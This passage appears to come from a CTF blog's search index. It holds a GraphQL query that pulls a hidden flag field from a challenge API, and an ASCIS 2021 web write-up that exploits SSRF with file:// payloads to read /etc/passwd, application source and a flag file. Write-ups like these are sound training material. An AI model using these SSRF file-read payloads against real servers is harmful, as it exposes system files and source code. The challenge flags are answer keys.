'https://graphics.chal.intentsummit.org/api/v1/' \\--data '{\"operationName\":\"ExampleQuery\",\"variables\":{},\"query\":\"query ExampleQuery { _secret { flag } }\\n\"}'{\"data\":{\"_secret\":[{\"flag\":\"INTENT{d1d_y0u_m34n_flag}\"}]}} FLAG INTENT{d1d_y0u_m34n_flag}" }, { "title": "ASCIS CTF 2021 Qualifying Round", "url": "/posts/ASCIS-CTF-Qualifying-Round/", "categories": "CTF", "tags": "CTF", "date": "2021-10-25 01:30:00 +0530", "snippet": "ASCIS-CTF-2021-QUALS - 400pts Category: Web Name: OProxy Level: None Description: None Solution Overview challenge provided a search box for user type a url and then the server respon...", "content": "ASCIS-CTF-2021-QUALS - 400pts Category: Web Name: OProxy Level: None Description: None Solution Overview challenge provided a search box for user type a url and then the server response a content of webiste I used Burp Suite catch a request of url i has typed and i think its SSRF Then i found some techniques attack SSRF, well i found fetching a local file, I try this payload file://etc/passwd its seems nothing.But i realized its wrong format url SSRF techniques attack https://beaglesecurity.com/blog/article/server-side-request-forgery-attack.html So i added a IP 127.0.0.1 before /etc/passwd, file://127.0.0.1/etc/passwd and i found a system files The challenge server response header Werkzeug/1.0.1 Python/3.10.0, Backend of website is Flask, I used this payload file://127.0.0.1/app/main.py, well i found a source code https://pypi.org/project/Werkzeug/ I used payload file://127.0.0.1/app/flag.txt for read a flag. Finally i found a flag FLAG ASCIS{SSRF_M3mcached_inj3cti0n}" } ]
